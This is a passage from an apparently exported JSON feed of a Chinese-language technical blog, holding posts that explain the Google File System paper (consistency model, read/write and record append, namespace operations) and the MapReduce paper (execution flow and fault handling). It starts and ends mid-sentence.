的规则，增量更新指的应该就是这一点。对于当前文件中的最后一个块而言，它只在没有写满 64KB 的情况下才会被追加内容，否则内容会被追加到下一个块中。而在追加操作前，块的 checksum 计算的是 64KB 中已经写入的部分，在追加操作时只需要 update 新写入的部分即可。这时并不需要读取并验证原来的 checksum 是否正确，因为如果写入原来的内容时预期的内容是 1111，而实际写入的是 1112，上面的等式的左边就是 md5(&quot;1111&quot;).update(&quot;2222&quot;)，右边就是 md5(&quot;11122222&quot;)，它们是不相等的。这样在下次对这个块进行读取时就可以发现问题并作出反应了。 除了通过主动读取来验证 checksum，当 ChunkServer 处于一个低负载状态时，它也会扫描自己保存的所有 chunk 上的各个块，判断是否出现 checksum 验证不通过的现象，并将这些信息上报给 Master，Master 也会根据这些信息进行 re-replication，从而保证集群中的数据完整。 总结到此为止，我想讨论的 GFS 相关的内容就结束了。为了更好地理解 GFS 的内部机制，我找到了一个 GFS 的简单实现，用 golang 语言开发，在此也把它分享给各位。","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"},{"name":"存储","slug":"存储","permalink":"/categories/存储/"}],"tags":[]},{"title":"浅析 Google File System（二）","slug":"GFS2","date":"2022-07-05T14:02:03.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2022/07/05/GFS2/","link":"","permalink":"/2022/07/05/GFS2/","excerpt":"","text":"论文下载 前言上一篇博客中讨论了 GFS 的部分操作接口，主要聚焦在 Master 和 Client 上。但是对于一个文件系统而言，文件的存储才是其核心的能力，本文将讨论 GFS 的读写接口，包括读写文件的流程以及一致性模型。虽然 GFS 作为一个分布式的文件系统，仅实现了一个非常宽松的一致性模型，但却足以支撑 Google 内部的一些业务。此外，GFS 的一些错误处理在下一篇文章中继续讨论。 GFS 的一致性模型在讨论读写操作前，首先要先介绍一下 GFS 的一致性模型。这里的一致性指 ChunkServer 上的一致性，关于 Master 的一致性在后面的内容中会涉及。 GFS 定义了两个词，一致的（consistent）和确定的（defined）。具体来说，同一个 chunk 可能会被保存多份，那么如果这些副本中的内容相同，就说这是一致的；而如果用户向 chunk 中写入了内容，然后读取时发现内容和写入的一样，就说这是确定的。 一致的比较好理解，但为什么会有不确定的现象呢。这主要在于 GFS 在同一时间可能被多个用户访问，如果用户 A 向 chunk1 中写入内容，那么在他执行读取操作前， chunk1 中的内容是有可能被用户 B 修改的，所以用户 A 读取出来的内容就和写入不一样，也就是不确定。另外，如果用户 A 和用户 B 同时向两个 chunk 中写入内容，也就是 128MB 大小的数据，也可能会出现第一个 chunk 是用户 A 写入的内容，第二个 chunk 是用户 B 写入的内容的情况，或者反过来，这也是不确定的。 对于 write 和 record append 两个操作，GFS 提供了不同的一致性保证，具体如下表所示： write record append 顺序访问 defined 且 consistent defined 但是有一些 inconsistent 的内容 并发访问 undefined 且 consistent defined 但是有一些 inconsistent 的内容 写入失败 inconsistent inconsistent 光看这张表的话不是很容易理解，下面我们分别针对不同的操作来具体讨论。 write 操作对于一个 chunk 而言，它可能会有多个 replica，分布式系统应该保证 replica 的内容是一致的，这被 GFS 称之为 consistent。从表中 write 的部分可以看到，只要写入成功，那么 GFS 的状态一定是 consistent 的，通常而言，这种一致性需要一个协调者来实现。 GFS 把这个协调者的任务交给 replica 的其中一个，具体交给谁呢，这取决于 GFS 把租约（lease）下发给谁，拿到租约的 replica 被称为 primary，而其余的 replica 被称为 secondary。按照我的理解，租约可以看作是带时间限制的锁，GFS 把这个时间限制设为 60 秒，这意味着如果一个 replica 拿到了租约，那么通常它在其后的 60 秒内会作为 primary，然后负责协调并发写入时的顺序。为什么说通常是 60 秒呢，因为租约既可以被续租，也可以被提前回收。比如前面提到的 snapshot 操作，就需要回收被复制的目录及其内部所有文件的租约，避免在创建快照的途中发生写入操作造成混乱。 论文 3.1 小节详细描述了 GFS 读写文件的流程，但是我觉得有一些遗漏。文中以客户端询问 Master 某个 chunk 及其 replica 的位置作为流程的第一步，我认为作为一个文件系统，客户端应该处理的是“在文件 A 的第 X 字节偏移处写入 Y 个字节”这样的语义。所以整个流程的第一步应该是客户端根据 X 的值算出 chunk 的下标和写入位置在 chunk 上的偏移量，由于 chunk 固定为 64 MB，所以这很容易。这样以后，客户端需要的信息就是“文件 A 的第 Z 个 chunk 在哪里”，而这正是 Master 可以提供的服务。 Master 在返回客户端结果时需要告诉它哪个 replica 是 primary，所以如果此时还没有 primary，那么 Master 会先下发一个租约给某个 chunk，然后再把信息返回给客户端。客户端拿到这些信息后会将它们缓存在本地，下次查询相同的信息时就可以避免再与 Master 交互。3.1 小节中提到客户端仅在 primary 不可访问或它不再拥有租约时才会再次向 Master 获取这些信息，但是 2.4 小节中提到客户端缓存的信息会过期，或 reopen 文件时被清空，所以在这些情况下，客户端同样需要访问 Master 来获取 chunk 的位置信息。 确定了 primary 和其他 replica 的位置后，客户端就可以向它们所在的 ChunkServer 推送数据了。GFS 采用了一种流水线式的传输，即客户端会将数据传输给离它最近的 ChunkServer，而这个 ChunkServer 在接收数据的同时又会将数据发送给另一个 ChunkServer，以此类推，最终达到的效果就是客户端仅需要与一个 ChunkServer 交互，就可以将数据推送给所有与本次传输相关的 ChunkServer。从这里也可以得知，ChunkServer 是有能力知道它上面的某个 chunk 的其他 replica 在哪个 ChunkServer 上的，这可能是客户端在发送数据前告知它的，也可能是它查询了 Master，不论是哪种方式，都需要保证数据传输时不会出现环路，即 A 发给 B，B 发给 C，C 发给 A 的情况。 ChunkServer 收到来自客户端或其他 ChunkServer 的数据后，会将它们先放在一个内部的 LRU 缓存里，论文中没有解释为什么要用 LRU，根据这种缓存的性质来推测，可能是想尽可能保证热点数据被写入。因为只有缓存中的数据才有机会被写入到 chunk 中，而机器的内存是有限的，所以要尽可能把那些热点的数据放在缓存里，这样即便内存不足，被逐出缓存的也只是那些相对较冷的数据。 当所有相关的 ChunkServer 都收到了数据后，客户端会发送一个写请求给 primary，这个请求中标识了刚刚传输的数据，也就是可以从前文提到的 LRU 缓存中找出对应的内容。primary 会决定一个执行写入的顺序，然后按这个顺序将 LRU 缓存中的内容写入到对应的 chunk 中，成功后会将这个请求转发给其他的 replica，让它们也将缓存中的内容持久化到 chunk 里。primary 给写入请求做了编号，来保证其他 replica 的写入顺序和自己是一致的，而只要写入顺序是相同的，那么一旦写入成功，最终 chunk 的状态就是一致的，也就是所谓的 consistent。当 primary 收到所有其他 replica 写入成功的消息，它就会回复客户端写入成功。 这是比较理想的情况，现实里也会存在写入失败的情况，比如可能 LRU 缓存中的内容已经被逐出，那么客户端发送写请求到 primary 时，它就不能根据里面的标识在缓存中找到对应的数据。此外，写入 chunk 时也可能会遇到问题。如果上述操作中的任意环节出现问题，客户端都会认为写入失败。这时 chunk 的内容是不确定的，大概率是不一致的，也就是表中的 inconsistent，GFS 对于这种情况的处理相当简单粗暴，就是重试。 record append 操作record append 操作和 write 操作的流程大体类似，论文 3.3 小节中对此作出了一些描述。在机制上，record append 操作和 write 操作的主要区别在于，追加时的文件偏移是由 GFS 决定的，而 write 操作的偏移是由用户决定的。除此之外，追加写入的内容最大只能是 16 MB，原因见下文。 根据 3.3 中的内容，可以推测客户端会询问 Master 类似“文件 A 的最后一个 chunk 在哪”这样的问题，然后 Master 做和上文所述的同样的操作（也就是下发租约，返回结果）。然后客户端将数据以流水线的形式推送到各个相关的 ChunkServer 上，然后对 primary 发送写请求。这时，如果 primary 发现当前的 chunk 中剩余的空间不足以写入追加的内容，那么会将剩余的空间填充（pad），然后让其余的 replica 也做同样的操作，结束后返回客户端失败，并让它在下一个 chunk 上重试。反之，如果当前 chunk 中剩余的空间可以容纳追加的内容，那么就执行正常的写入流程并保证一致性（即在同样的偏移处写入同样的内容，如果因为上一个 record append 操作失败导致 primary 上 chunk 最后的位置是 X，其他 replica 最后的位置是 Y，那么写入时以 X 为准），再返回客户端文件内容在 chunk 上的偏移。由于追加内容最大是 16 MB，所以用于填充剩余空间的部分不会超过 16 MB，也就是说每个 chunk 最多浪费 16 MB 的空间。 这个流程中可能让人疑惑的点在于为什么客户端要先将数据推送到 ChunkServer 上，再由 ChunkServer 决定是否可以执行写入呢？如果 ChunkServer 决定不能写入，那么刚刚推送的数据就没有任何意义。为什么不先询问 ChunkServer 是否有足够的空间，再决定是否推送数据呢？原因在于，即便先查询的结果是有足够的空间，在传输数据后执行写入时也可能没有足够的空间，因为这中间隔了非常久的时间，而追加操作又是多个客户端并发的，所以在这个时间间隔内可能其他的客户端已经完成了追加操作占满了 chunk 的空间。 那是否可以让 ChunkServer 为某个客户端预留一块空间，或者让 Master 参与协调将多个客户端的追加操作调度一下呢？这也不行，一方面会增加系统的复杂度，另一方面，即便 GFS 为某个客户端预留了一块空间，客户端也完全可以选择不向里面写入数据，而这块空间又不能被其他客户端使用，这样 chunk 的空间就浪费了。 从上面的描述中可以发现，GFS 处理 record append 的写入错误也同样使用重试，只不过由于 record append 是在文件的最后一个 chunk 的末尾写入数据，所以第二次重试时写入的位置和第一次已经不一样了。那么多次重试直到某次写入成功，此时整个文件中至少有一个 chunk handle 对应的 chunk，它的某个位置上拥有完整的追加内容，且其他 replica 在这个位置上也有同样的完整的内容。而与之相对，此前的失败追加也会在 chunk 中留下各种不一致的内容，但 GFS 本身保证的就是至少一次的原子追加，所以这些不一致是可以容忍的。 总结来看，record append 中成功的操作会在 chunk 的某个位置上留下完整的内容，且这个内容不会因为其他客户端的并发 record append 操作而被覆盖掉，也就是所谓的确定的（defined），但失败的操作也会在 chunk 中留下一些不一致的内容，也就是所谓的 inconsistent。这就是前文的表中所描述的内容了。 read 操作相较于写入，read 操作就显得非常简单了。首先，客户端想知道“文件 A 的 X～Y 字节偏移处的内容”，那么由于一个 chunk 的大小是固定的 64 MB，客户端就可以根据这个需求计算出 chunk 的下标，然后用文件名和下标来向 Master 查询位置信息。为了减少 IO 的消耗，客户端向 Master 发送的一次请求中可以询问多个 chunk 的信息。 客户端拿到这个信息后，同样会将它缓存在本地，缓存的过期条件和之前的描述是一样的。客户端寻找一个离它最近的 ChunkServer，然后从那里读取 chunk 中的内容。从上面对 write 操作和 record append 操作的描述中可以得知，chunk 中是存在不一致的内容的，不过这对 Google 而言不是什么问题，因为他们随机读的需求也比较少，像之前讨论的 MapReduce 就是读取了完整的文件，而由于 GFS 的“至少一次”的一致性保证，MapReduce 最终也一定会读取到它需要的内容。 但是在读取时，整个流程也需要配合 GFS 的错误处理机制，比如前面讨论 record append 时，可以得知文件中会有一些被 GFS 填充的空内容，那么读取时就应该跳过这些内容（可能是按需跳过）。除此之外，由于写入时有可能发生错误（比如比特反转），GFS 在读取时在一定程度上也可以识别到这种错误并作出合理的反应，具体要怎么做就放在下一篇博客中吧。","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"},{"name":"存储","slug":"存储","permalink":"/categories/存储/"}],"tags":[]},{"title":"浅析 Google File System（一）","slug":"GFS1","date":"2022-07-03T14:02:03.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2022/07/03/GFS1/","link":"","permalink":"/2022/07/03/GFS1/","excerpt":"","text":"论文下载 前言继续拜读三驾马车，最近阅读了 GFS 的论文。这篇于 2003 年被收录在 SOSP 上的论文描述了一个工作在上千台机器的集群上的文件系统，其设计影响了后续很多项目，比如 HDFS 就是它的一种开源实现。我没有参与那个年代的技术变革，但是看了很多对这篇论文的评价，大家的观点基本是一样的，即，GFS 在技术上并没有什么创新点，它只是非常好地做了 trade-off，并以一种非常简单的设计做出了适合 Google 内部需求的强大系统。 于是这篇文章就用来记录一些我的读后总结，欢迎一起交流:-) 概述GFS 的使用者是 Google 内部的一些应用（比如之前的 MapReduce），所以其设计就需要满足内部的需求。论文的第 1 节和第 2.1 节中都有一些需求上的描述，具体来说包括以下几点：1）GFS 应该工作在由很多常规设备组建的集群上，这意味着需要把“设备会出错”作为一种必然事件来对待；2）操作的文件都是大文件，通常有几个 GB 大小，所以 GFS 在大文件的处理上要优于小文件；3）在写入文件时，追加操作是非常频繁的，几乎没有随机写操作，所以 GFS 对追加写操作做了一些优化，并且也相对更强调它的一致性。 在设计上，GFS 中包括三个组件，分别是 Master、ChunkServer 和 Client，其中 Master 和 ChunkServer 都是用户态的程序，而 Client 以库的形式被业务代码使用。 下面简单介绍下这三个组件，更详细的内容见后文。 Client 负责根据业务代码的需求发送请求与 Master 和 ChunkServer 交互，从而完成各项操作，为了优化性能，它还会缓存一些信息在本地； ChunkServer 负责实际的文件存储，它管理的基本单元就是 Chunk，一个完整的文件会被拆分成多个 Chunk，并被存储在 ChunkServer 上。为了更好地容错，每个 Chunk 都会保存多份，这些 replica 被分布在不同的 ChunkServer 上，其数量可以由用户指定。Chunk 在被创建时会被分配一个全局唯一的 Chunk handle 作为标识，这个标识有 64bit 大小，客户端可以使用它向某个 ChunkServer 索要数据。在表现上，每个 Chunk 都是一个按需动态扩展大小的文件（最大 64MB），也就是说 GFS 直接使用了 Linux 的文件系统来提供存储能力，而由于 Linux 在读取文件时自带缓存，所以 GFS 并没有实现自己的缓存； Client 在读取文件时是只知道文件名的，那它如何知道文件对应的 Chunk 是哪些，而这些 Chunk 又在哪台 ChunkServer 上呢？这就要通过 Master 了，具体而言，Master 中保存了所有文件到 Chunk 的映射，以及 Chunk 的具体位置，Client 在读写文件时首先通过 Master 来获知对应的 Chunk 和其位置，然后就直接与对应的 ChunkServer 进行交互了，Master 在这里只是起到类似索引的作用。而除了这个功能，Master 还负责锁管理、垃圾回收、过期 Chunk 检测等功能。 操作接口论文 2.2 小节中提到，GFS 并没有实现类似 POSIX 标准的文件系统接口，它支持的操作有 create、delete、open、close、read、write、snapshot、record append。除了这些操作外，根据后文的描述以及之前对 MapReduce 的解读，还可以推知 GFS 也支持 rename 操作。根据我的理解，这些操作可以被划分为三组，具体见下表： 组编号 操作 主要被操作的组件 1 open/close Client 2 create/delete/snapshot/rename Master 3 read/write/record append ChunkServer 为什么这样区分呢？且听我细细道来。 第1组对于 open/close 操作，论文中并没有过多的提及，但我们前面提到为了优化性能，Client 会缓存一些信息。比如在读取时，它会通过 Master 查询“文件 A 的第 X 个 Chunk 在哪”这样的信息，并以文件名+Chunk下标作为键进行缓存，缓存的过期方式有两个，其一是达到了设置的过期时间，其二就是重新打开这个文件。对于重新打开文件这一点，论文 2.7.1 节中的描述是 which purges from the cache all chunk information for that file。基于这一点，我推测文件的打开和关闭操作主要影响的是客户端，比如 open 操作用于在客户端建立对应文件的缓存结构，而 close 操作将这个结构释放掉。 我没有在论文中找到类似排他打开的操作，如果 GFS 支持这种操作，那么 open/close 必然要通知到 Master。与之类似的，如果 GFS 可以避免文件在打开时被删除，那么这两个操作也同样需要被通知到 Master。 第2组我们前面提到，Master 中保存了文件到 Chunk 的映射。这里所谓的文件，其实就是 /x/y/z 这样的一个字符串，GFS 并没有常规文件系统中的目录的结构（这种结构中记录了目录中的内容），所以我认为在实现上Master 的这种映射关系保存成 kv 存储也没问题，但是出于减小体积、加快查找速度、方便恢复（详见后文）等方面的考虑，GFS 将文件路径组织成树状结构，并称其为 Namespace。在这棵树上的每个节点都有一对锁，分别是 read 锁与 write 锁，两种锁相互配合来避免并发的操作导致 Namespace 的混乱。这里的操作指什么呢，主要指的就是第二组中的内容。 create 操作顾名思义，create 用于在 Namespace 中建立一个新的节点，论文中没有提到 create 的流程，但我认为如果仅仅是 create 文件，那并不需要立即为其创建一个 chunk，可以把 chunk 的创建延迟到到对这个文件执行写入时。前面提到 Namespace 中的每个节点都有一对锁，在 create 一个新节点时这对锁也会参与进来。具体来说，假设我们要创建 /home/hygao/file1，那么在创建的过程中 /home、/home/hygao 都会被加上 read 锁，而 /home/hygao/file1 会被加上 write 锁。这意味着，我们可以同时创建 /home/hygao/file2，因为 /home 和 /home/hygao 都是 read 锁，而 read 锁之间并不冲突，但我们不能同时创建 /home/hygao/file1，因为 /home/hygao/file1 已经被上了 write 锁，write 锁之间是相互冲突的。 delete 操作论文中重点介绍了删除文件的场景，但没怎么提及删除目录的场景（从论文 4.1 小节中可以推断出 GFS 是支持删除目录的），所以这里仅讨论删除文件的相关内容。GFS 的 delete 包括 Master 中元数据的删除以及对应 Chunk 的删除，整个过程需要和 Master 的垃圾回收功能相配合。 具体而言，当用户申请删除一个文件时，GFS 将这个文件 rename 为一个隐藏名（其实个人电脑的回收站也是这个原理），这个隐藏名中记录了删除时的时间戳。GFS 会定期扫描 Namespace，所以它可以知道这些被标记为“应该删除”的文件已经在“回收站”中保存了多久，而用户可以配置一个最大保存时间，超过这个时间的“应该删除”的文件就会真的执行删除，在此之前，用户可以通过将这些文件 rename 成普通文件的方式来避免它们被删除。所谓”真的执行删除“，就是将这个节点从 Namespace 中移除掉，这样该文件对应的 Chunk 就变成了孤儿（orphaned chunk），即没有任何一个文件引用它们，此时 Master 就可以向对应的 ChunkServer 发送指令，让它们删除掉对应的 chunk，从而释放硬盘空间。 这种机制的好处在于删除操作会非常快速（因为仅涉及 namespace 的操作），且误删时在一定时间内还可以将其快速恢复。与之相对的，坏处在于所谓的删除其实并没有立即释放出硬盘的空间，这在空间吃紧的情况下是非常无力的。如何解决这个问题呢？根据论文的描述，如果用户重复删除同一个文件，那么垃圾回收会被加速；此外，用户可以指定一个节点的删除策略，这样在用户执行 delete 时文件就会被立即删除并释放空间，这样的删除不可恢复，而这里提到的节点，其实就代表可以在目录和文件两个维度进行配置。 其实根据上面的描述，可以推测出还有第三种加速删除的方式，因为 GFS 判断文件在“回收站”里保存了多久是根据文件名中的时间戳，而用户首先可以访问这些文件，其次可以对其 rename，那只要修改掉文件中的时间戳，让 GFS 认为这个文件已经被保存很久了，就可以在下次垃圾回收时将它清理掉了:-P 此外由于在对文件操作时（比如后面的 snapshot）不能将其删除，所以可以推测 delete 也会给文件加上 write 锁。 snapshot 操作根据我的理解，snapshot 操作应该类似于个人电脑上对文件或文件夹的复制，复制后的文件或目录拥有与复制源相同的内容，但对复制后的内容的修改不会影响到复制源。GFS 支持目录和文件两个级别的 snapshot，不过论文中只介绍了文件级别的流程，所以这里也同样仅讨论文件的 snapshot 操作。GFS 对这个操作做了一些优化，具体包括 CoW 和本地复制。 CoW 也就是 copy-on-write，这项技术旨在尽可能复用已有的内容。在 GFS 的场景下，表现为当用户执行 snapshot 时，新的文件对应的 chunk 同样使用源文件的 chunk。也就是说，如果有文件 /file1，其对应的 chunk 为 A、B、C，那么对其执行 snapshot 创建文件 /file2 时，这个新文件对应的 chunk 同样是 A、B、C。由于 snapshot 出的新文件本身就拥有和源文件同样的内容，所以在用户对新文件执行 read 操作时不会感受到有什么问题。 但是写文件时就不一样了，如前所述，对新文件的修改不会影响到源文件，这要怎么做呢？就是 CoW，即用户对文件对应的某个 chunk 执行写入时，Master 会让 ChunkServer 复制一个新的 chunk 出来，并为其分配 chunk handle，再把这个新的 chunk handle 返回给客户端，此后客户端的写入请求都在这个新的 chunk 上生效，从而避免了对源 chunk 的影响。这里 Master 会认为需要创建一个新的 Chunk，是因为每个 Chunk 保存了一个引用计数，如果它大于 1，那么就说明需要创建新的 Chunk，创建后会将源 Chunk 的引用计数减一，因为此时被读取的文件已经引用了新的 Chunk。 那么本地复制指的是什么呢，其实这是我自己起的名字:-P。它实际表示的是，Master 在创建新的 chunk 时，会让源 chunk 所在的 ChunkServer 来创建这个新的 chunk，这样的好处在于 chunk 的复制不需要走网络，相关的 IO 都仅发生在磁盘上，根据论文，Google 的磁盘读写速度差不多是网络的 3 倍。但是这也会有一个问题，就是如果源 ChunkServer 上的磁盘容量不足以创建这个新的 chunk 该怎么办，我不清楚文件系统会不会对此做什么优化，不过论文中并没有对这种情况作出说明。 最后，根据 4.1 小节，snapshot 会给文件加上 write 锁，从而避免 snapshot 的过程中发生删除、创建新文件等。 rename 操作论文中并没有描述 rename 的流程，但是从 MapReduce 以及文中的一些描述我们可以推断 GFS 是支持这个操作的，而且这个操作是原子的。根据这一点，我推测 rename 操作会给源文件与目标文件加 write 锁。 而 rename 的原理应该就是节点内容的迁移，比如把 /file1 文件 rename 成 /file2，就是把 /file1 对应的 chunk 给 /file2，然后删除 /file1 这条记录，这个操作只涉及 Master，不会对 ChunkServer 产生影响。这里的删除指的是从 Namespace 中直接删掉，而不是前面提到的 delete 操作。 第 3 组最后一组就是最重要的操作了，因为它主要与 ChunkServer 进行交互，也就是完成对文件的读写，这是一个文件系统的核心能力。虽然这是 GFS 中最有趣的部分，但是为了避免这篇文章太长，所以这部分以及后续的内容就放在下一篇文章中来讨论吧:-)","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"},{"name":"存储","slug":"存储","permalink":"/categories/存储/"}],"tags":[]},{"title":"浅析批处理框架 MapReduce","slug":"MapReduce","date":"2022-06-22T18:44:06.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2022/06/23/MapReduce/","link":"","permalink":"/2022/06/23/MapReduce/","excerpt":"","text":"论文下载 前言最近拜读了 Google 三驾马车中的 MapReduce，这个被发布在 2004 年的论文中介绍了一个工作在分布式文件系统 GFS 之上的“批处理”框架。尽管由于各种原因， Google 在很久前就声称内部不再使用 MapReduce 了，但因为这个框架非常经典，以及当前依然有很多系统将它作为执行引擎（比如一些框架在 MapReduce 上添加 DSL 来做声明式系统），我认为研究这个框架仍然具有很大的意义。 概述MapReduce 非常有趣的一点在于，它试图为使用者屏蔽掉分布式带来的大多数问题（没有完全屏蔽，因为 Partition 函数或 Combiner 函数都要求用户对任务在节点上的分布有一个明确的感知），诸如拆分输入、并行执行、错误处理、节点通信等底层的问题都由框架来处理。在使用上，它要求用户至少提供一个 Map 任务和一个 Reduce 任务，通常而言，Map 用于处理并行任务，而 Reduce 则将 Map 的输出进行聚合并产生最终的输出。 框架会将这些任务分配给集群中的多个节点来做分布式的执行。这里借用论文中提供的执行说明图，来简单阐述下框架的执行过程（结合论文 Appendix A 中的代码来看这幅图会更好一些，但由于篇幅原因，这里就不把相应的内容贴过来了）： 首先，对于一个任务而言，集群中存在 master 和 worker 两类节点（为了方便描述，这里将“分配到 master 程序的节点”称为 master 节点，worker 同理），顾名思义，master 负责协调任务的执行，worker 则是干活的。从论文提供的代码中可以看到，worker 的数量可以通过 spec.set_machines(&lt;数量&gt;) 来设置，不过注释中提到这里是设置“最多使用的机器数量”。与之相对的，master 则只有一个。 用户要做的任务是定义 Map 和 Reduce，然后声明输入文件和输出文件的名字，根据论文提供的代码，用户可以通过 out-&gt;set_filebase(&lt;前缀&gt;) 声明输出文件的前缀，比如 out-&gt;set_filebase(&quot;/gfs/test/freq&quot;)，而输出文件剩余的部分取决于 reduce 的数量，因为一个 reduce 对应一个输出文件。如果有 100 个 reduce，那么最终就会生成 /gfs/test/freq-00000-of-00100、/gfs/test/freq-00001-of-00100 这样的文件。不过不清楚为什么要从 0 开始，如果这样那么最后一个文件的名字可能就是 /gfs/test/freq-00099-of-00100，看起来怪怪的。 当用户定义了 Map 和 Reduce 任务后，master 会给 worker 分配任务，由于通常而言 map 和 reduce 的数量和都是大于 worker 的数量的，所以一个 worker 可能会被分配到多个任务。那么 map 和 reduce 的数量是如何确定的呢？对于 map 而言，数量是自动确定的。框架会把输入文件拆分成 16～64 MB 的一个个输入块（split），每个块的具体大小由用户控制。这样一来，只要知道输入文件的大小，就可以知道需要被分割成多少个输入块，而由于一个 map 任务处理一个输入块，所以 map 任务的数量也就知道了；与之相对的，reduce 任务的数量则由用户通过 out-&gt;set_num_tasks(&lt;数量&gt;) 自己定义。 Map 任务读取输入，根据配置好的规则将输入解析成一个一个的 Key-Value pair，然后用这个 k-v pair 作为入参调用用户提供的代码来产生输出，输出同样以 k-v pair 的形式表示，首先会被写入到内存中，然后由框架周期性地将这些结果写入到本地磁盘（注意和 GFS 的全局存储区分开）中。在写入的过程中会调用用户提供的分区函数对输出进行分区，比如 hash(Key) % &lt;Reduce 任务的数量&gt;，因此一个 map 任务可能会产生很多分区。map 任务产生的这些文件对应的位置会上报给 master 节点，然后 master 节点会将各个分区文件的位置发给对应的 reduce 任务。 当 reduce 任务收到 master 节点的通知时，它会通过 RPC 来从各个 map 任务那里拉取属于自己分区的文件。而当 reduce 任务拉取到所有的文件时，它会对这些文件中的 k-v pair 做排序，排序的结果使得所有具有相同 key 的 value 被聚合在一起，而 key 本身则也根据其语义被排序。对于排序本身而言，根据内存中是否能容纳所有的数据，reduce 任务会按需使用硬盘做辅助空间进行外部排序。 经过这样的处理后，框架会遍历排好序的结果，依次为其调用用户提供的 reduce 代码。代码接受一个 key 和一个迭代器作为参数，迭代器中的内容是属于这个 key 的所有 value，之所以要使用迭代器而不是一个简单的列表，是为了避免一个 key 中的所有 value 的数量过大，导致内存不能将其容纳进来。迭代器屏蔽了数据的来源，不管数据是来自于内存还是硬盘，在代码层面的处理都是相同的。 当分区中所有的内容都被用户提供的 reduce 任务处理后，就会在前文所述的输出文件中产生处理后的结果。而到此为止，整个 MapReduce 任务就结束了。 细节前面描述了一次 MapReduce 任务的大概流程，在这个基础上，依然有一些细节问题值得探讨，下面按发生的顺序来一一阐述。 首先，Google 的 MapReduce 是运行在 GFS 集群上的，作为一个分布式的文件系统，GFS 将文件按 64 MB拆分成几个小块，并存储在不同的机器上，而这些机器很可能就被作为了 MapReduce 的 worker。这就给了框架进行优化的空间，具体来说，master 可以通过 GFS 获知到输入文件的布局，比如节点 A 上有文件块 B，而节点 A 又是一个 worker，那么 master 就可以把处理 B 的 map 分配到节点 A 上，这样 map 在读取输入块时就不需要通过网络来拉取数据，直接从本地就可以获取到，从而节省了不必要的网络传输。 其次，map 在读取输入时，实际上读取到的是经过拆分的输入块，该输入块的大小由用户来定义。但是，考虑这样一种情况，假设用户将输入块的大小定义为 16MB，但是这个输入块中最后一条记录是不完整的，对于这整条记录而言，它的前半部分在这个输入块中，而后半部分在下一个输入块中。在这样的情况下，如果依然严格按照 16MB 进行拆分，那么这两个输入块对应的 map 任务都会因为这条不完整的记录而出现问题。对于这个问题，论文 4.4 节表示输入是被一种叫做 reader 的组件来拆分的，而 reader 是知道如何将文件拆分成有意义的记录的（原文：Each input type implementation knows how to split itself into meaningful ranges for processing as separate map tasks），所以我猜测在 reader 这一层面会根据具体的需求灵活地分隔文件，也即前文所述的 16～64 MB 的限制并不是一个硬性限制。 然后，用户可以提供 Partition 函数来帮助 map 决定输出的内容需要被存储的位置。除此之外，用户还可以提供 Combiner 函数。关于这个组件的作用，论文 4.3 节有详细的描述，可以简单地将其理解为一种预处理。论文提供的代码中，被用作 reduce 任务的内容同样被作为了 combiner，这意味着 combiner 函数在执行前，map 产生的内容应该是被排好序的。如论文 4.2 节所言，给定一个分区，内部的 key 是有序的。那么结合 combiner 来看，这个有序就不仅指 reduce 收到的完整的 partition 内容是有序的，对于 map 产生的部分 partition，内部的内容也同样是有序的才对。 接着，MapReduce 提供一种备份任务机制。具体而言，当 MapReduce 过程近乎完成时，框架会把那些尚未完成的任务分配给空闲的 worker，这样同样的任务就有可能被多个 worker 执行，而任意一个 worker 执行成功，master 都会认为这个任务执行成功，从而避免某个 worker 因为各种外部原因（比如硬盘老化导致写入时要不停地进行纠错从而降低写入速度）拖慢整个 MapReduce 的执行速度。 最后，一些特殊的输入可能导致 map/reduce 任务异常退出，这可能是因为用户的代码有 bug，也可能是因为记录本身有问题。要避免因为这种问题导致 MapReduce 无法正常完成，最好的解决办法当然是找出 bug 或记录的问题，但除此之外，框架也允许用户跳过这个会导致问题的记录。具体而言，框架提供了一种特殊的运行模式，在这种模式下，如果 map/reduce 任务异常退出，那么 master 可以感知到是因为哪条记录，然后重新把任务分配给 worker 让其重新执行，如果这次执行同样发生了异常退出，那么 master 在下一次分配这个任务时会告知 worker 跳过这条有问题的记录，从而避免流程进入 执行-异常退出-执行 的死循环中。 错误处理尽管在使用上基本类似于单机框架，但 MapReduce 本质上是作用在分布式环境下的，对于一个分布式系统而言，错误处理永远是一个特别重要的话题。下面来探讨下 MapReduce 框架是如何进行错误处理的。 在深入机制之前，我们首先要明确 MapReduce 是一个批处理框架，这意味着实时性并不是特别重要，如果用户提交了一个任务，需要几分钟乃至几个小时才能执行完成，这都是一个非常正常的情况。也正因为如此，MapReduce 的错误处理非常简单，最核心的就是重试。 因为需要重试，所以 map/reduce 任务的类型是有限的，根据论文的描述，它应该是确定性（deterministic）的，也就是说，同一个任务不论执行多少次，产生的输出都应该是一样的。除此之外，我认为任务本身还应该是幂等的，这意味着类似“每处理一条记录就写一条日志来标识”的操作是有问题的，因为重试很可能导致某条记录对应的日志不唯一。 在机制上，master 节点会定期地 ping 一下所有的 worker 节点，如果某个节点没有回复响应，那么 master 就将这个 worker 标记为异常，然后将它上面运行的所有任务在正常的 worker 上重新执行。那么，重试对整个执行流程有什么影响吗？答案是没什么影响，我们分别针对 map 和 reduce 来讨论。 首先对于 map 而言，master 有这样一条限制：如果已经从一个 map 获取到了其上报的中间文件信息，且这个 map 所在的 worker 是正常的，那么会忽略不同 worker 上的同一个 map 上报的信息。这条限制也是前文所述的备份任务得以正常执行的前提。因此，如果一个 map 所在的 worker 异常了，那么 master 会将同样的 map 分配给其他的 worker，即便后面这个 worker 恢复了，master 也会从这两份 map 上报的信息中选择更早的那一份作为最终的文件路径。如前所述，这些输出文件是被保存在 map 所在 worker 自己的本地磁盘上的，所以只要两个 map 所在的 worker 不同，产生的文件就互不影响。而确定了最终的文件路径后，master 会将其通知给所有的 reduce，这时如果哪个 reduce 没有获取或尚未获取完这个 map 对应的输出文件，那么将继续从这个新的 worker 上拉取对应的输出文件。 然后是 reduce，为了避免因为重试导致的多个 reduce 实例一起写入同一个最终输出文件（例如 